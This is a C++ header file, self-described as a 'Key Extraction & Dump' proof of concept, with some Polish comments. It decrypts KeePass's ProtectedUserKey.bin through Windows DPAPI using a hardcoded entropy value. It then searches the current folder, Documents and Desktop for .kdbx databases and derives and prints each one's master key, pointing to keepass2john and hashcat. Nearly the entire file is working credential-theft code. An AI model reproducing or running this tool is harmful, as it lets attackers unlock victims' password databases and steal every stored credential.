// KeePass.h (Key Extraction & Dump - PoC)
#ifndef KEEPASS_H
#define KEEPASS_H

#include "CryptoEngine.h"
#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <vector>
#include <string>
#include <fstream>
#include <iostream>
#include <iomanip>
#include <algorithm>
#include <filesystem>
#include <cstring>

#include <openssl/evp.h>
#include <openssl/kdf.h>
#include <openssl/core_names.h>
#include <openssl/params.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

namespace KeePass {

    // ============================================================
    // Utility
    // ============================================================
    inline std::vector<BYTE> ReadFileBytes(const std::wstring& path) {
        std::ifstream f(std::filesystem::path(path), std::ios::binary);
        if (!f.is_open()) return {};
        return std::vector<BYTE>((std::istreambuf_iterator<char>(f)),
                                 std::istreambuf_iterator<char>());
    }

    inline std::wstring GetKnownFolder(const KNOWNFOLDERID& rfid) {
        wchar_t* p = nullptr;
        if (SUCCEEDED(SHGetKnownFolderPath(rfid, 0, nullptr, &p))) {
            std::wstring r(p ? p : L"");
            CoTaskMemFree(p);
            return r;
        }
        return L"";
    }

    inline std::vector<BYTE> Concat(const std::vector<BYTE>& a,
                                    const std::vector<BYTE>& b) {
        std::vector<BYTE> r(a);
        r.insert(r.end(), b.begin(), b.end());
        return r;
    }

    inline std::vector<BYTE> Sha256(const std::vector<BYTE>& data) {
        BCRYPT_ALG_HANDLE  hAlg  = nullptr;
        BCRYPT_HASH_HANDLE hHash = nullptr;
        std::vector<BYTE>  hash(32);
        DWORD cbObj = 0, cbRes = 0;

        BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0);
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbObj,
                          sizeof(DWORD), &cbRes, 0);
        std::vector<BYTE> obj(cbObj);
        BCryptCreateHash(hAlg, &hHash, obj.data(), cbObj, nullptr, 0, 0);
        BCryptHashData(hHash, (PUCHAR)data.data(), (ULONG)data.size(), 0);
        BCryptFinishHash(hHash, hash.data(), 32, 0);

        if (hHash) BCryptDestroyHash(hHash);
        if (hAlg)  BCryptCloseAlgorithmProvider(hAlg, 0);
        return hash;
    }

    inline std::string ToHex(const std::vector<BYTE>& data) {
        std::ostringstream ss;
        ss << std::hex << std::setfill('0');
        for (BYTE b : data) ss << std::setw(2) << (int)b;
        return ss.str();
    }

    // ============================================================
    // DPAPI – odszyfrowanie ProtectedUserKey.bin
    // ============================================================
    inline std::vector<BYTE> GetUserKeyFromDPAPI() {
        std::wstring pukPath = GetKnownFolder(FOLDERID_RoamingAppData) + L"\\KeePass\\ProtectedUserKey.bin";
        std::error_code ec;
        if (!std::filesystem::exists(pukPath, ec) || ec) {
            std::cout << "[-] ProtectedUserKey.bin not found.\n";
            return {};
        }

        std::vector<BYTE> fileBytes = ReadFileBytes(pukPath);
        if (fileBytes.empty()) return {};

        static const BYTE kpEntropy[16] = {
            0xDE, 0x13, 0x5B, 0x5F, 0x18, 0xA3, 0x46, 0x70,
            0xB2, 0x57, 0x24, 0x29, 0x69, 0x88, 0x98, 0xE6
        };

        DATA_BLOB in  { static_cast<DWORD>(fileBytes.size()),
                        const_cast<BYTE*>(fileBytes.data()) };
        DATA_BLOB ent { 16, const_cast<BYTE*>(kpEntropy) };
        DATA_BLOB out { 0, nullptr };

        if (!CryptUnprotectData(&in, nullptr, &ent, nullptr, nullptr, 0, &out))
            return {};

        std::vector<BYTE> rawKey(out.pbData, out.pbData + out.cbData);
        LocalFree(out.pbData);
        return rawKey;
    }

    // ============================================================
    // KDBX Header
    // ============================================================
    enum HeaderId : BYTE {
        HDR_END              = 0x00,
        HDR_COMMENT          = 0x01,
        HDR_CIPHER_ID        = 0x02,
        HDR_COMPRESSION      = 0x03,
        HDR_MASTER_SEED      = 0x04,
        HDR_TRANSFORM_SEED   = 0x05,
        HDR_TRANSFORM_ROUNDS = 0x06,
        HDR_ENCRYPTION_IV    = 0x07,
        HDR_KDF_PARAMETERS   = 0x0B,
        HDR_PLUGIN_DATA      = 0x0C,
    };

    struct KdbxHeader {
        BYTE      cipherId[16]{};
        BYTE      masterSeed[32]{};
        BYTE      transformSeed[32]{};
        ULONGLONG transformRounds = 0;
        BYTE      encryptionIv[16]{};
        BYTE      compression = 0;
        bool      isKdbx4     = false;
        bool      aesKdf      = false;
        bool      argon2Kdf   = false;
        bool      isArgon2id  = false;

        ULONGLONG argon2Memory      = 0;
        ULONGLONG argon2Iterations  = 0;
        ULONG     argon2Parallelism = 0;
        ULONG     argon2Version     = 0x13;
        BYTE      argon2Salt[32]{};
        size_t    argon2SaltLen     = 0;

        size_t    headerEndOffset = 0;
    };

    inline void ParseKdfParameters(const BYTE* data, DWORD len, KdbxHeader& hdr);

    inline bool ParseOuterHeader(const std::vector<BYTE>& file, KdbxHeader& hdr) {
        if (file.size() < 12) return false;

        DWORD version = *(DWORD*)(file.data() + 8);
        WORD  major   = (WORD)(version >> 16);
        hdr.isKdbx4   = (major >= 4);

        size_t pos = 12;
        while (pos < file.size()) {
            BYTE  type;
            DWORD fieldLen;
            size_t sizeFieldLen;

            if (hdr.isKdbx4) {
                if (pos + 5 > file.size()) return false;
                type         = file[pos];
                fieldLen     = *(DWORD*)(file.data() + pos + 1);
                sizeFieldLen = 4;
            } else {
                if (pos + 3 > file.size()) return false;
                type         = file[pos];
                fieldLen     = *(WORD*)(file.data() + pos + 1);
                sizeFieldLen = 2;
            }
            pos += 1 + sizeFieldLen;

            if (type == HDR_END) { hdr.headerEndOffset = pos; break; }
            if (pos + fieldLen > file.size()) return false;

            switch (type) {
            case HDR_CIPHER_ID:
                if (fieldLen >= 16) memcpy(hdr.cipherId, file.data() + pos, 16);
                break;
            case HDR_COMPRESSION:
                if (fieldLen >= 1) hdr.compression = file[pos];
                break;
            case HDR_MASTER_SEED:
                if (fieldLen >= 32) memcpy(hdr.masterSeed, file.data() + pos, 32);
                break;
            case HDR_TRANSFORM_SEED:
                if (fieldLen >= 32) memcpy(hdr.transformSeed, file.data() + pos, 32);
                hdr.aesKdf = true;
                break;
            case HDR_TRANSFORM_ROUNDS:
                if (fieldLen >= 8) hdr.transformRounds = *(ULONGLONG*)(file.data() + pos);
                break;
            case HDR_ENCRYPTION_IV:
                if (fieldLen >= 16) memcpy(hdr.encryptionIv, file.data() + pos, 16);
                break;
            case HDR_KDF_PARAMETERS:
                ParseKdfParameters(file.data() + pos, fieldLen, hdr);
                break;
            }
            pos += fieldLen;
        }
        return hdr.headerEndOffset > 0;
    }

    inline void ParseKdfParameters(const BYTE* data, DWORD len, KdbxHeader& hdr) {
        if (len < 2) return;
        size_t pos = 2;

        while (pos + 1 <= len) {
            BYTE tag = data[pos++];
            if (tag == 0x00) break;

            if (pos + 4 > len) break;
            DWORD nameLen = *(DWORD*)(data + pos); pos += 4;
            if (pos + nameLen > len) break;
            std::string name(reinterpret_cast<const char*>(data + pos), nameLen);
            pos += nameLen;

            if (pos + 4 > len) break;
            DWORD valueLen = *(DWORD*)(data + pos); pos += 4;
            if (pos + valueLen > len) break;

            const BYTE* v = data + pos;

            if (name == "$UUID" && valueLen >= 16) {
                static const BYTE argon2dUUID[16]  = {
                    0xEF,0x63,0x6D,0xDF,0x8C,0x29,0x44,0x4B,
                    0x91,0xF7,0xA9,0xA4,0x03,0xE3,0x0A,0x0C
                };
                static const BYTE argon2idUUID[16] = {
                    0x9E,0x29,0x8B,0x19,0x56,0xDB,0x47,0x73,
                    0xB2,0x3D,0xFC,0x3E,0xC6,0xF0,0xA1,0xE6
                };
                static const BYTE aesKdbx4UUID_KP[16] = {
                    0xC9,0xD9,0xF3,0x9A,0x62,0x8A,0x44,0x60,
                    0xBF,0x74,0x0D,0x08,0xC1,0x8A,0x4F,0xEA
                };
                static const BYTE aesKdbx4UUID_XC[16] = {
                    0x7C,0x02,0xBB,0x82,0x79,0xA7,0x4A,0xC0,
                    0x92,0x7D,0x11,0x4A,0x00,0x64,0x82,0x38
                };

                if (memcmp(v, argon2dUUID, 16) == 0) {
                    hdr.argon2Kdf = true; hdr.isArgon2id = false;
                } else if (memcmp(v, argon2idUUID, 16) == 0) {
                    hdr.argon2Kdf = true; hdr.isArgon2id = true;
                } else if (memcmp(v, aesKdbx4UUID_KP, 16) == 0 ||
                           memcmp(v, aesKdbx4UUID_XC, 16) == 0) {
                    hdr.aesKdf = true;
                }
            } else if (name == "S") {
                size_t n = valueLen;
                if (n > sizeof(hdr.transformSeed)) n = sizeof(hdr.transformSeed);
                memcpy(hdr.transformSeed, v, n);
                n = valueLen;
                if (n > sizeof(hdr.argon2Salt)) n = sizeof(hdr.argon2Salt);
                memcpy(hdr.argon2Salt, v, n);
                hdr.argon2SaltLen = n;
            } else if (name == "R" && valueLen >= 8) {
                hdr.transformRounds = *(ULONGLONG*)v;
            } else if (name == "M" && valueLen >= 8) {
                hdr.argon2Memory = *(ULONGLONG*)v;
            } else if (name == "I" && valueLen >= 8) {
                hdr.argon2Iterations = *(ULONGLONG*)v;
            } else if (name == "P" && valueLen >= 4) {
                hdr.argon2Parallelism = *(ULONG*)v;
            } else if (name == "V" && valueLen >= 4) {
                hdr.argon2Version = *(ULONG*)v;
            }

            pos += valueLen;
        }
    }

    // ============================================================
    // AES-KDF
    // ============================================================
    inline std::vector<BYTE> TransformKeyAES(const std::vector<BYTE>& compositeKey,
                                             const BYTE seed[32],
                                             ULONGLONG rounds) {
        BCRYPT_ALG_HANDLE hAlg = nullptr;
        BCRYPT_KEY_HANDLE hKey = nullptr;

        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0) != 0)
            return {};
        BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                          (PUCHAR)BCRYPT_CHAIN_MODE_ECB,
                          sizeof(BCRYPT_CHAIN_MODE_ECB), 0);

        DWORD cbObj = 0, cbRes = 0;
        BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, (PUCHAR)&cbObj,
                          sizeof(DWORD), &cbRes, 0);
        std::vector<BYTE> keyObj(cbObj);

        if (BCryptGenerateSymmetricKey(hAlg, &hKey, keyObj.data(), cbObj,
                                       (PUCHAR)seed, 32, 0) != 0) {
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return {};
        }

        std::vector<BYTE> buf = compositeKey;
        if (buf.size() != 32) {
            BCryptDestroyKey(hKey);
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return {};
        }

        for (ULONGLONG i = 0; i < rounds; ++i) {
            DWORD cbOut = 0;
            std::vector<BYTE> out(32);
            if (BCryptEncrypt(hKey, buf.data(), 32, nullptr, nullptr, 0,
                              out.data(), 32, &cbOut, 0) != 0) {
                BCryptDestroyKey(hKey);
                BCryptCloseAlgorithmProvider(hAlg, 0);
                return {};
            }
            memcpy(buf.data(), out.data(), 32);
        }

        std::vector<BYTE> transformed = Sha256(buf);
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return transformed;
    }

    // ============================================================
    // Argon2 (OpenSSL EVP_KDF)
    // ============================================================
    inline std::vector<BYTE> TransformKeyArgon2(const std::vector<BYTE>& compositeKey,
                                                const KdbxHeader& hdr) {
        const char* algoName = hdr.isArgon2id ? "ARGON2ID" : "ARGON2D";
        EVP_KDF*    kdf  = EVP_KDF_fetch(nullptr, algoName, nullptr);
        if (!kdf) return {};

        EVP_KDF_CTX* kctx = EVP_KDF_CTX_new(kdf);
        if (!kctx) { EVP_KDF_free(kdf); return {}; }

        std::vector<BYTE> result(32);

        uint32_t lanes   = static_cast<uint32_t>(hdr.argon2Parallelism);
        uint32_t memcost = static_cast<uint32_t>(hdr.argon2Memory);
        uint32_t iter    = static_cast<uint32_t>(hdr.argon2Iterations);
        uint32_t version = static_cast<uint32_t>(hdr.argon2Version ? hdr.argon2Version : 0x13);

        OSSL_PARAM  params[8];
        OSSL_PARAM* p = params;
        *p++ = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_PASSWORD,
                    const_cast<BYTE*>(compositeKey.data()), compositeKey.size());
        *p++ = OSSL_PARAM_construct_octet_string(OSSL_KDF_PARAM_SALT,
                    const_cast<BYTE*>(hdr.argon2Salt), hdr.argon2SaltLen);
        *p++ = OSSL_PARAM_construct_uint32(OSSL_KDF_PARAM_ARGON2_LANES,   &lanes);
        *p++ = OSSL_PARAM_construct_uint32(OSSL_KDF_PARAM_ARGON2_MEMCOST, &memcost);
        *p++ = OSSL_PARAM_construct_uint32(OSSL_KDF_PARAM_ITER,          &iter);
        *p++ = OSSL_PARAM_construct_uint32(OSSL_KDF_PARAM_ARGON2_VERSION, &version);
        *p++ = OSSL_PARAM_construct_end();

        if (EVP_KDF_derive(kctx, result.data(), result.size(), params) != 1)
            result.clear();

        EVP_KDF_CTX_free(kctx);
        EVP_KDF_free(kdf);
        return result;
    }

    // ============================================================
    // Dump kluczy dla jednej bazy
    // ============================================================
    inline void DumpKeysForKdbx(const std::wstring& kdbxPath,
                                const std::vector<BYTE>& userKey) {
        std::wcout << L"\n  [*] Database: " << kdbxPath << L"\n";

        std::vector<BYTE> file = ReadFileBytes(kdbxPath);
        if (file.size() < 256) {
            std::cout << "      [-] File too small / unreadable.\n";
            return;
        }

        KdbxHeader hdr;
        if (!ParseOuterHeader(file, hdr)) {
            std::cout << "      [-] Header parse failed.\n";
            return;
        }

        std::cout << "      Format      : KDBX " << (hdr.isKdbx4 ? "4" : "3.1") << "\n";
        std::cout << "      Compression : " << (hdr.compression ? "gzip" : "none") << "\n";
        std::cout << "      Master seed : " << ToHex(std::vector<BYTE>(hdr.masterSeed, hdr.masterSeed + 32)) << "\n";
        std::cout << "      Enc. IV     : " << ToHex(std::vector<BYTE>(hdr.encryptionIv, hdr.encryptionIv + 16)) << "\n";

        if (hdr.argon2Kdf) {
            std::cout << "      KDF         : Argon2" << (hdr.isArgon2id ? "id" : "d") << "\n";
            std::cout << "      Argon2 M    : " << hdr.argon2Memory << " KiB\n";
            std::cout << "      Argon2 I    : " << hdr.argon2Iterations << "\n";
            std::cout << "      Argon2 P    : " << hdr.argon2Parallelism << "\n";
            std::cout << "      Argon2 salt : " << ToHex(std::vector<BYTE>(hdr.argon2Salt, hdr.argon2Salt + hdr.argon2SaltLen)) << "\n";
        } else if (hdr.aesKdf) {
            std::cout << "      KDF         : AES-KDF\n";
            std::cout << "      Transform seed : " << ToHex(std::vector<BYTE>(hdr.transformSeed, hdr.transformSeed + 32)) << "\n";
            std::cout << "      Rounds      : " << hdr.transformRounds << "\n";
        } else {
            std::cout << "      [-] Unknown KDF.\n";
            return;
        }

        std::vector<BYTE> innerHash = Sha256(userKey);
        std::vector<BYTE> composite = Sha256(innerHash);

        std::cout << "      ────────────────────────────────────────\n";
        std::cout << "      UserKey (DPAPI) : " << ToHex(userKey) << "\n";
        std::cout << "      SHA256(UserKey) : " << ToHex(innerHash) << "\n";
        std::cout << "      Composite key   : " << ToHex(composite) << "\n";

        std::vector<BYTE> transformed;
        if (hdr.argon2Kdf)
            transformed = TransformKeyArgon2(composite, hdr);
        else
            transformed = TransformKeyAES(composite, hdr.transformSeed, hdr.transformRounds);

        if (transformed.size() != 32) {
            std::cout << "      [-] KDF failed.\n";
            return;
        }
        std::cout << "      Transformed key : " << ToHex(transformed) << "\n";

        std::vector<BYTE> keyInput(hdr.masterSeed, hdr.masterSeed + 32);
        keyInput = Concat(keyInput, transformed);
        std::vector<BYTE> masterKey = Sha256(keyInput);

        std::cout << "      ────────────────────────────────────────\n";
        std::cout << "      MASTER KEY      : " << ToHex(masterKey) << "\n";
        std::cout << "      ────────────────────────────────────────\n";
    }

    // ============================================================
    // Entry point (Przeszukiwanie folderu bieżącego, Dokumentów, Pulpitu, Pobranych)
    // ============================================================
    inline void Run() {
        std::cout << "\n=== KeePass Key Extraction & Dump ===\n";

        std::vector<BYTE> userKey = GetUserKeyFromDPAPI();
        if (userKey.empty()) {
            std::cout << "[-] Failed to get user key from DPAPI.\n";
            return;
        }
        std::cout << "[+] ProtectedUserKey.bin decrypted (" << userKey.size() << " bytes).\n";

        std::vector<std::wstring> searchDirs;

        // 1. Running folder
        std::error_code cwdEc;
        auto cwd = std::filesystem::current_path(cwdEc);
        if (!cwdEc) searchDirs.push_back(cwd.wstring());

        // 2. Documents
        std::wstring docs = GetKnownFolder(FOLDERID_Documents);
        if (!docs.empty()) searchDirs.push_back(docs);

        // 3. Desktop
        std::wstring desktop = GetKnownFolder(FOLDERID_Desktop);
        if (!desktop.empty()) searchDirs.push_back(desktop);

        // 4. Downloads
        /*std::wstring downloads = GetKnownFolder(FOLDERID_Downloads);
        if (!downloads.empty()) searchDirs.push_back(downloads);*/

        std::vector<std::wstring> candidates;
        auto scanDir = [&](const std::wstring& dir) {
            std::error_code e2;
            if (!std::filesystem::exists(dir, e2) || e2) return;
            std::filesystem::recursive_directory_iterator it(
                dir,
                std::filesystem::directory_options::skip_permission_denied,
                e2);
            std::filesystem::recursive_directory_iterator end;
            while (it != end) {
                if (e2) break;
                bool regular = false;
                try { regular = it->is_regular_file(e2); } catch (...) {}
                if (regular && !e2 && it->path().extension() == L".kdbx") {
                    std::wstring p = it->path().wstring();
                    // Dodaj tylko jeśli jeszcze nie ma na liście (unikanie duplikatów)
                    if (std::find(candidates.begin(), candidates.end(), p) == candidates.end()) {
                        candidates.push_back(p);
                    }
                }
                it.increment(e2);
            }
        };

        for (const auto& dir : searchDirs) {
            scanDir(dir);
        }

        if (candidates.empty()) {
            std::cout << "[-] No .kdbx files found in candidate directories.\n";
            return;
        }

        std::cout << "[*] Candidate databases found: " << candidates.size() << "\n";

        for (auto& kdbx : candidates) {
            DumpKeysForKdbx(kdbx, userKey);
        }

        std::cout << "\n[*] Done. Use these master keys with keepass2john / hashcat or an offline reader.\n";
    }

} // namespace KeePass

#endif